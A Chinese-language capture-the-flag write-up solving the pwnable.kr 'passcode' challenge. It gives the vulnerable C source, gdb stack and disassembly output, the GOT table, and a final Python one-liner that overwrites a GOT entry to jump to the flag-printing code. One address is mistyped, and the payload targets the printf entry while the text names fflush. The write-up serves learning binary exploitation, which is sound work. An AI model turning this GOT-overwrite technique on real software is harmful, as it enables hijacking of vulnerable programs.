# Solution
## 描述
```
Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)
```

## 分析
首先查看文件
```
ls -l
total 16
-r--r----- 1 root passcode_pwn   48 Jun 26  2014 flag
-r-xr-sr-x 1 root passcode_pwn 7485 Jun 26  2014 passcode
-rw-r--r-- 1 root root          858 Jun 26  2014 passcode.c
```
查看源代码`cat passcode.c`
```C
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```
这段代码可以输入的地方有三处
* `welcome`中`scanf("%100s", name);`
* `login`中`scanf("%d", passcode1);`
* `login`中`scanf("%d", passcode2);`

观察到在函数`login`中，`scanf("%d", passcode1);`和`scanf("%d", passcode2);`两句话没有取地址，也就是说`scanf`会把`passcode1`中的值当成输入的地址，而这个变量的值取决于当时该变量所处栈帧的值，如果我们能够控制该栈帧的值，我们就能往任意一个地址输入四个字节的数据。

### 获得`name`的地址
使用[bof](../bof/bof.md)中的方法，找到函数`welcome`中`name[100]`的首地址：
* 使用gdb调试，在`scanf("%100s", name);`之后设置断点，运行程序输入标识字符串(我使用`XXXXXXXXXXXXXXXXXXXXXXXX`）
* 然后使用`x/40xw $sp`查看栈空间中`40`字节的数据
```
 X/40xw $sp
0xfff53c90:	0x080487dd	0xfff53ca8	0xf76f5d60	0xf75af71b
0xfff53ca0:	0xf76f5d60	0x08922008	0x58585858	0x58585858
0xfff53cb0:	0x58585858	0x58585858	0x58585858	0x58585858
0xfff53cc0:	0x58585858	0x58585858	0xfff50058	0xf76f5000
0xfff53cd0:	0xf75b0067	0xf76f5000	0x00000027	0xf75a517b
0xfff53ce0:	0xf76f5d60	0x0000000a	0x00000027	0xf76f9000
0xfff53cf0:	0xf77176db	0xf7545700	0x00000000	0xf76f5d60
0xfff53d00:	0xfff53d38	0xf771dee0	0xf75a502b	0xbbd70500
0xfff53d10:	0xf76f5000	0xf76f5000	0xfff53d38	0x0804867f
0xfff53d20:	0x080487f0	0x08048250	0x080486a9	0x00000000
```
得到`name`的地址是`0xfff53ca8`

### 获得`passcode1`的地址
使用gdb反汇编`login`函数
```
(gdb) disas
Dump of assembler code for function login:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	sub    $0x28,%esp
   0x0804856a <+6>:	mov    $0x8048770,%eax
   0x0804856f <+11>:	mov    %eax,(%esp)
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    $0x8048783,%eax
   0x0804857c <+24>:	mov    -0x10(%ebp),%edx
   0x0804857f <+27>:	mov    %edx,0x4(%esp)
   0x08048583 <+31>:	mov    %eax,(%esp)
=> 0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    0x804a02c,%eax
   0x08048590 <+44>:	mov    %eax,(%esp)
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    $0x8048786,%eax
   0x0804859d <+57>:	mov    %eax,(%esp)
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    $0x8048783,%eax
   0x080485aa <+70>:	mov    -0xc(%ebp),%edx
   0x080485ad <+73>:	mov    %edx,0x4(%esp)
   0x080485b1 <+77>:	mov    %eax,(%esp)
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:	movl   $0x8048799,(%esp)
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
   0x080485c5 <+97>:	cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	movl   $0x80487a5,(%esp)
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	movl   $0x80487af,(%esp)
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave  
   0x080485f0 <+140>:	ret    
   0x080485f1 <+141>:	movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	movl   $0x0,(%esp)
   0x08048604 <+160>:	call   0x8048480 <exit@plt>
End of assembler dump.
```
注意到`<+19>`到`<+31>`这一段是给`scanf`传参的过程，于是可以定位`passcode1`的地址是`-0x10(%ebp)`，查看`$ebp`的值如下：
```
info registers $ebp
ebp            0xfff53d18	0xfff53d18
```
于是`passcode1`的地址是`0xffff53d08`正好是`name[100]`的最后四个字节，于是我们可以通过构造第一次的输入来控制`passcode`的值，从而向某个指定的地址输入四个字节的数据

### GOT覆写
elf文件中有一个GOT表，里面储存了一些函数的跳转地址，比如`login`函数中的`0x08048593 <+47>:	call   0x8048430 <fflush@plt>`指令，系统会(通过查询`PLT`来)查询`GOT`表，找到`fflush`函数的跳转地址。

通过`readelf`命令可以查看`elf`文件的`GOT`表
```
readelf -r passcode

Relocation section '.rel.dyn' at offset 0x388 contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff0  00000606 R_386_GLOB_DAT    00000000   __gmon_start__
0804a02c  00000b05 R_386_COPY        0804a02c   stdin@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x398 contains 9 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0
0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
0804a010  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0
0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a018  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
```
可以看到`fflush`的`GOT`条目的偏移地址是`0x0804a004`，这个地址处的内容是`fflush`函数的跳转地址，我们只要把这个地址处的内容通过`scanf`覆写掉，在执行`fflush`的时候就会跳转到我们写进去的地址处了

### 找到输出`flag`的代码地址
输出`flag`的汇编代码如下
```
0x080485e3 <+127>:	movl   $0x80487af,(%esp)
0x080485ea <+134>:	call   0x8048460 <system@plt>
```
找到地址为`0x080485e3`，即`134514147`

### 总结
攻击过程如下：
* 构造`name[100]`的输入，把`passcode1`的值改为`GOT`表中`fflush`的地址
* 在`scanf("%d", passcode1);`时，输入‘输出`flag`的代码段’的地址
* 程序调用`fflush`，跳转到我们指定的地址执行，输出代码段

## 问题解决
输入如下代码
```
 (python -c "print 'X' * 96 + '\x00\xa0\x04\x08'"; echo "134514147" ) | ./passcode
```